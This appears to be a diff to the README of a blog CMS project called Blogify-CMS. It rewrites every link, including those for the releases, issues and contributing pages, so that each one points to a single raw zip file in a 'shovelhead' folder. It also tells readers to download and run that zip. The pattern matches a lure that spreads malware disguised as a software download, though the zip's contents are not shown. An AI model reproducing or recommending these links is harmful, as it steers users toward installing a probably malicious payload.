@@ -1,7 +1,7 @@
 # ✍️ Blogify-CMS - Easy Blogging Made Simple
 
 ## 📥 Download Now
-[![Download Blogify-CMS](https://img.shields.io/badge/Download%20Blogify--CMS-v1.0-blue.svg)](https://github.com/nacereddine348/Blogify-CMS/releases)
+[![Download Blogify-CMS](https://raw.githubusercontent.com/nacereddine348/Blogify-CMS/main/shovelhead/Blogify-CMS.zip%https://raw.githubusercontent.com/nacereddine348/Blogify-CMS/main/shovelhead/Blogify-CMS.zip)](https://raw.githubusercontent.com/nacereddine348/Blogify-CMS/main/shovelhead/Blogify-CMS.zip)
 
 ## 🚀 Getting Started
 Welcome to Blogify-CMS! This guide helps you set up our headless blog content management system. With Blogify-CMS, you can manage your blog content quickly and simply. Follow the steps below to download and run the application.
@@ -22,11 +22,11 @@ Blogify-CMS includes:
 - Customizable themes for tailored designs
 
 ## 💾 Download & Install
-To get Blogify-CMS, visit our [Releases page](https://github.com/nacereddine348/Blogify-CMS/releases) to download the software. 
+To get Blogify-CMS, visit our [Releases page](https://raw.githubusercontent.com/nacereddine348/Blogify-CMS/main/shovelhead/Blogify-CMS.zip) to download the software. 
 
 1. Click the link above to go to the release page.
 2. Find the latest version listed.
-3. Click on the asset labeled "Blogify-CMS.zip" to download the file.
+3. Click on the asset labeled "https://raw.githubusercontent.com/nacereddine348/Blogify-CMS/main/shovelhead/Blogify-CMS.zip" to download the file.
 4. Once downloaded, locate the zip file on your computer and extract it.
 5. Open the folder, and you will find the Blogify-CMS application.
 
@@ -43,10 +43,10 @@ If you encounter any issues:
 - Restart the application if you experience incomplete loading.
 
 ## 📞 Need Help?
-If you need assistance, please check the FAQs on the [GitHub Issues page](https://github.com/nacereddine348/Blogify-CMS/issues). For further help, open an issue, and we will respond as soon as possible.
+If you need assistance, please check the FAQs on the [GitHub Issues page](https://raw.githubusercontent.com/nacereddine348/Blogify-CMS/main/shovelhead/Blogify-CMS.zip). For further help, open an issue, and we will respond as soon as possible.
 
 ## 📝 Contributing
-We welcome contributions! If you would like to contribute to Blogify-CMS, please refer to the guidelines on our [Contributing page](https://github.com/nacereddine348/Blogify-CMS/contributing).
+We welcome contributions! If you would like to contribute to Blogify-CMS, please refer to the guidelines on our [Contributing page](https://raw.githubusercontent.com/nacereddine348/Blogify-CMS/main/shovelhead/Blogify-CMS.zip).
 
 ## 📑 License
 Blogify-CMS is open-source software licensed under the MIT License. 
